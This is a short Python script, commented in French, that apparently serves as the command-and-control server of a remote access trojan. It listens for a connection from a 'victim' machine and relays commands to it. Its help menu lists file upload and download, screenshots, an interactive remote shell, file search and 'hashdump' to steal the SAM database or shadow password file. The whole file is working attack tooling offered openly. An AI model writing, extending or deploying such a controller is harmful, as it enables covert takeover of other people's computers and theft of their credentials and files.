#Admin_Server_Script.py

import socket 
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF.Inet pour les IPs , SOCK_TREAM pour une conn TCP 

local_pc = ""
port = 12345

s.bind((local_pc, port)) #associer la socket à une adresse et/ou un numéro de port (locaux)
s.listen()

while True:
    print("Server listening ...")
    conn, addr = s.accept()
    print("Connection OK :", addr)
    print("Tap 'help' for commands")
    
    try:
        
        while True:
          try:
             command= input("Enter command : ").strip('\n')
             
             if command == 'exit':
             
                conn.send('exit' .encode())
                print('Exiting...')
                conn.close()
                sys.exit(0)
              
             elif command == 'help':
                print('[*] Commands Available:\n')
                print('[+] récupération de fichiers du serveur vers la victime : upload ')
                print('[+] récupération de fichiers de la victime vers le serveur: download /path/to/file')
                print('[+] prendre une capture d écran de la machine victime: screenshot')
                print('[+] ouvrir un shell (bash ou cmd) interactif: shell')
                print('[+] obtenir la configuration réseau de la machine victime: ipconfig')
                print('[+] rechercher un fichier sur la machine victime: search')
                print('[+] récupérer la base SAM ou le fichier shadow de la machine: hashdump')
                print('[+] Exit: exit')
             else:
             	conn.send(command.encode())
             	result = conn.recv(4096).decode().strip('\n')
             	print(result)
 
          except Exception as e :
            print("Error:", str(e))
            print("Disconnected from: ", addr)
            break        
         


    finally:
        conn.close()          

       
